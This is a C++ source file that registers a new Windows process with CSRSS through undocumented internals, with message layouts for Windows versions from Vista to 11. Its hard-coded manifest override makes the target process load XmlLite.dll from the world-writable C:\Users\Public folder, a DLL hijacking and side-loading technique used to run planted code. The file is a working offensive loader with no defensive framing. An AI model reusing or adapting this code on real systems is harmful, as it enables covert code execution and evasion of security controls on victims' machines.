#include "csrss.hpp"
#include "ntapi.hpp"
#include "otherapi.hpp"

#include <atlstr.h>

NTSTATUS CallCsrss(HANDLE hProcess, HANDLE hThread, PS_CREATE_INFO CreateInfo, UNICODE_STRING Win32ImagePath, UNICODE_STRING NtImagePath, CLIENT_ID ClientId, SECTION_IMAGE_INFORMATION SectionImageInfomation)
{
	NTSTATUS Status = NULL;
	PCSR_CAPTURE_BUFFER CaptureBuffer = 0;
	BASE_API_MSG BaseAPIMessage = { 0 };
	PBASE_CREATEPROCESS_MSG BaseCreateProcessMessage = &BaseAPIMessage.u.BaseCreateProcess;
	PUNICODE_STRING CsrStringsToCapture[6] = { 0 };
	CSR_API_NUMBER CSRAPINumber = CSR_MAKE_API_NUMBER(BASESRV_SERVERDLL_INDEX, BasepCreateProcess);
	ULONG DataLength = 0;
	UNICODE_STRING CultureFallBacks = { 0 };
	UNICODE_STRING AssemblyName = { 0 };
	USHORT ImageProcessorArchitecture = 0;
	ULONG RtlUserProcessParametersFlags = RTL_USER_PROC_IMAGE_KEY_MISSING | RTL_USER_PROC_APP_MANIFEST_PRESENT | RTL_USER_PROC_PARAMS_NORMALIZED;

	USHORT OSBuildNumber = NtCurrentPeb()->OSBuildNumber;

	std::string manifest = R"(<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"> 
<file loadFrom="C:\Users\Public\XmlLite.dll" name="XmlLite.dll" />
<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"> 
<security> 
  <requestedPrivileges> 
    <requestedExecutionLevel 
      level="asInvoker" 
      uiAccess="false"/> 
  </requestedPrivileges> 
</security> 
</trustInfo> 
</assembly>
)";


	// 
	switch (SectionImageInfomation.Machine)
	{
	case IMAGE_FILE_MACHINE_I386:
		//If this is a .NET ILONLY that needs to run in a 64-bit addressspace, then let SXS be aware of this
		if (CreateInfo.SuccessState.u2.s2.AddressSpaceOverride)
			ImageProcessorArchitecture = SharedUserData->NativeProcessorArchitecture;
		else
			ImageProcessorArchitecture = PROCESSOR_ARCHITECTURE_IA32_ON_WIN64;
		break;
	case IMAGE_FILE_MACHINE_ARMNT:
		ImageProcessorArchitecture = PROCESSOR_ARCHITECTURE_ARM;
		break;
	case IMAGE_FILE_MACHINE_HYBRID_X86:
		ImageProcessorArchitecture = PROCESSOR_ARCHITECTURE_IA32_ON_WIN64;
		break;
	case IMAGE_FILE_MACHINE_AMD64:
		ImageProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64;
		break;
	case IMAGE_FILE_MACHINE_ARM64:
		ImageProcessorArchitecture = PROCESSOR_ARCHITECTURE_ARM64;
		break;
	default:
		wprintf(L"[*] Kernel32: No mapping for ImageInformation.Machine == %04x\n", SectionImageInfomation.Machine);//DbgPrint_0
		ImageProcessorArchitecture = PROCESSOR_ARCHITECTURE_UNKNOWN;
		break;
	}

	// Weird L":" auto appended behind 2 bytes L"zh-CN\0zh-Hans\0zh\0en-US\0en" in LLVM (e.n...:.)
	CultureFallBacks.Buffer = (PWSTR)L"zh-CN\0zh-Hans\0zh\0en-US\0en\0"; // zh-CN en-US
	CultureFallBacks.Length = 54;//8?
	CultureFallBacks.MaximumLength = 54;//8

	AssemblyName.Buffer = (PWSTR)L"-----------------------------------------------------------";
	AssemblyName.Length = 118;
	AssemblyName.MaximumLength = 120;

	BaseCreateProcessMessage->ProcessHandle = hProcess;
	BaseCreateProcessMessage->ThreadHandle = hThread;
	BaseCreateProcessMessage->ClientId = ClientId;
	BaseCreateProcessMessage->CreationFlags = 0;
	BaseCreateProcessMessage->VdmBinaryType = NULL;

	wprintf(L"[*] OS: %d\n", OSBuildNumber);
	wprintf(L"============================================================================================\n");

	if (OSBuildNumber >= 18985)//19041 ? 19000
	{
		wprintf(L"[*] Windows 10 2004+ | Windows 11+ | Windows Server 2022+\n");
		RtlSecureZeroMemory(&BaseCreateProcessMessage->u.win2022.Sxs, sizeof((BaseCreateProcessMessage->u).win2022.Sxs));
		BaseCreateProcessMessage->u.win2022.Sxs.FileHandle = CreateInfo.SuccessState.FileHandle;

		BaseCreateProcessMessage->u.win2022.Sxs.ManifestOverrideOffset = (PVOID)manifest.c_str();// (PVOID)CreateInfo.SuccessState.ManifestAddress;
		BaseCreateProcessMessage->u.win2022.Sxs.ManifestOverrideSize = manifest.size();// CreateInfo.SuccessState.ManifestSize;


		BaseCreateProcessMessage->u.win2022.Sxs.Flags = BASE_MSG_SXS_ALTERNATIVE_MODE;
		BaseCreateProcessMessage->u.win2022.Sxs.ProcessParameterFlags = RtlUserProcessParametersFlags;
		BaseCreateProcessMessage->u.win2022.PebAddressNative = CreateInfo.SuccessState.PebAddressNative;
		BaseCreateProcessMessage->u.win2022.PebAddressWow64 = CreateInfo.SuccessState.PebAddressWow64;
		BaseCreateProcessMessage->u.win2022.ProcessorArchitecture = ImageProcessorArchitecture;
		CsrStringsToCapture[0] = &(BaseCreateProcessMessage->u.win2022.Sxs.Win32ImagePath = Win32ImagePath);
		CsrStringsToCapture[1] = &(BaseCreateProcessMessage->u.win2022.Sxs.NtImagePath = NtImagePath);
		CsrStringsToCapture[2] = &(BaseCreateProcessMessage->u.win2022.Sxs.CultureFallBacks = CultureFallBacks);
		CsrStringsToCapture[3] = &(BaseCreateProcessMessage->u.win2022.Sxs.AssemblyName = AssemblyName);

		CSRAPINumber = CSR_MAKE_API_NUMBER(BASESRV_SERVERDLL_INDEX, BasepCreateProcess2);//since 2004
		DataLength = sizeof(*BaseCreateProcessMessage);//536 = 456(0x1c8) + 80 
	}
	else if (OSBuildNumber >= 18214 || (OSBuildNumber <= 9600 && OSBuildNumber >= 8423) || (OSBuildNumber <= 7601 && OSBuildNumber >= 7600))//18362 | 9200
	{
		wprintf(L"[*] Windows 10 1903 | Windows 10 1909\n");
		wprintf(L"[*] Windows 8 | Windows 8.1 | Windows Server 2012 | Windows Server 2012 R2\n");
		wprintf(L"[*] Windows 7 | Windows Server 2008 R2\n");
		RtlSecureZeroMemory(&BaseCreateProcessMessage->u.win2012.Sxs, sizeof((BaseCreateProcessMessage->u).win2012.Sxs));
		BaseCreateProcessMessage->u.win2012.Sxs.FileHandle = CreateInfo.SuccessState.FileHandle;

		BaseCreateProcessMessage->u.win2012.Sxs.AppCompatSxsData = (PVOID)manifest.c_str();// (PVOID)CreateInfo.SuccessState.ManifestAddress;
		BaseCreateProcessMessage->u.win2012.Sxs.AppCompatSxsDataSize = manifest.size();// CreateInfo.SuccessState.ManifestSize;

		BaseCreateProcessMessage->u.win2012.Sxs.Flags = BASE_MSG_SXS_ALTERNATIVE_MODE;
		BaseCreateProcessMessage->u.win2012.Sxs.ProcessParameterFlags = RtlUserProcessParametersFlags;
		BaseCreateProcessMessage->u.win2012.PebAddressNative = CreateInfo.SuccessState.PebAddressNative;
		BaseCreateProcessMessage->u.win2012.PebAddressWow64 = CreateInfo.SuccessState.PebAddressWow64;
		BaseCreateProcessMessage->u.win2012.ProcessorArchitecture = ImageProcessorArchitecture;
		CsrStringsToCapture[0] = &(BaseCreateProcessMessage->u.win2012.Sxs.Win32ImagePath = Win32ImagePath);
		CsrStringsToCapture[1] = &(BaseCreateProcessMessage->u.win2012.Sxs.NtImagePath = NtImagePath);
		CsrStringsToCapture[2] = &(BaseCreateProcessMessage->u.win2012.Sxs.CultureFallBacks = CultureFallBacks);
		CsrStringsToCapture[3] = &(BaseCreateProcessMessage->u.win2012.Sxs.AssemblyName = AssemblyName);

		DataLength = sizeof((BaseCreateProcessMessage->u).win2012.Sxs) + 80;//272 = 192 + 80
	}
	else if (OSBuildNumber >= 6000)
	{
		wprintf(L"[*] Windows 10 1803 | Windows 10 1809 | Windows Server 2019\n");
		wprintf(L"[*] Windows 10 1703 | Windows 10 1709\n");
		wprintf(L"[*] Windows 10 1507 | Windows 10 1511 | Windows 10 1607 | Windows Server 2016\n");
		wprintf(L"[*] Windows  Vista  | Windows Server 2008\n");
		RtlSecureZeroMemory(&BaseCreateProcessMessage->u.win2016.Sxs, sizeof((BaseCreateProcessMessage->u).win2016.Sxs));
		BaseCreateProcessMessage->u.win2016.Sxs.FileHandle = CreateInfo.SuccessState.FileHandle;

		BaseCreateProcessMessage->u.win2016.Sxs.AppCompatSxsData = (PVOID)manifest.c_str();// (PVOID)CreateInfo.SuccessState.ManifestAddress;
		BaseCreateProcessMessage->u.win2016.Sxs.AppCompatSxsDataSize = manifest.size();// CreateInfo.SuccessState.ManifestSize;

		BaseCreateProcessMessage->u.win2016.Sxs.Flags = BASE_MSG_SXS_ALTERNATIVE_MODE;
		BaseCreateProcessMessage->u.win2016.Sxs.ProcessParameterFlags = RtlUserProcessParametersFlags;
		BaseCreateProcessMessage->u.win2016.PebAddressNative = CreateInfo.SuccessState.PebAddressNative;
		BaseCreateProcessMessage->u.win2016.PebAddressWow64 = CreateInfo.SuccessState.PebAddressWow64;
		BaseCreateProcessMessage->u.win2016.ProcessorArchitecture = ImageProcessorArchitecture;
		CsrStringsToCapture[0] = &(BaseCreateProcessMessage->u.win2016.Sxs.Win32ImagePath = Win32ImagePath);
		CsrStringsToCapture[1] = &(BaseCreateProcessMessage->u.win2016.Sxs.NtImagePath = NtImagePath);
		CsrStringsToCapture[2] = &(BaseCreateProcessMessage->u.win2016.Sxs.CultureFallBacks = CultureFallBacks);
		CsrStringsToCapture[3] = &(BaseCreateProcessMessage->u.win2016.Sxs.AssemblyName = AssemblyName);

		DataLength = sizeof((BaseCreateProcessMessage->u).win2016.Sxs) + 80;//264 = 184 + 80
	}
	else
	{
		wprintf(L"[-] Unknow OSBuildNumber or it isn't supported.\n");
		return STATUS_NOT_SUPPORTED;
	}

	if (CsrStringsToCapture[0]->Length != 0)
	{
		wprintf(L"BaseCreateProcessMessage->Sxs.Win32ImagePath: %ls\n", CsrStringsToCapture[0]->Buffer);
		wprintf(L"BaseCreateProcessMessage->Sxs.NtImagePath: %ls\n", CsrStringsToCapture[1]->Buffer);
		wprintf(L"BaseCreateProcessMessage->Sxs.CultureFallBacks: ");
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), CsrStringsToCapture[2]->Buffer, CsrStringsToCapture[2]->Length / 2, NULL, 0);
		wprintf(L"\nBaseCreateProcessMessage->Sxs.AssemblyName: %ls\n", CsrStringsToCapture[3]->Buffer);

		//DbgPrint( "*** CSRSS: CaptureBuffer outside of ClientView\n" );
		//CaptureBuffer should in ClientView [CsrPortHeap] or return STATUS_INVALID_PARAMETER(0xC000000D)
		wprintf(L"[+] CsrCaptureMessageMultiUnicodeStringsInPlace: 0x%08x\n", CsrCaptureMessageMultiUnicodeStringsInPlace(&CaptureBuffer, 4, CsrStringsToCapture));
		return CsrClientCallServer((PCSR_API_MSG)&BaseAPIMessage, CaptureBuffer, CSRAPINumber, DataLength);
	}
	else
	{
		return STATUS_ACCESS_VIOLATION;
	}
}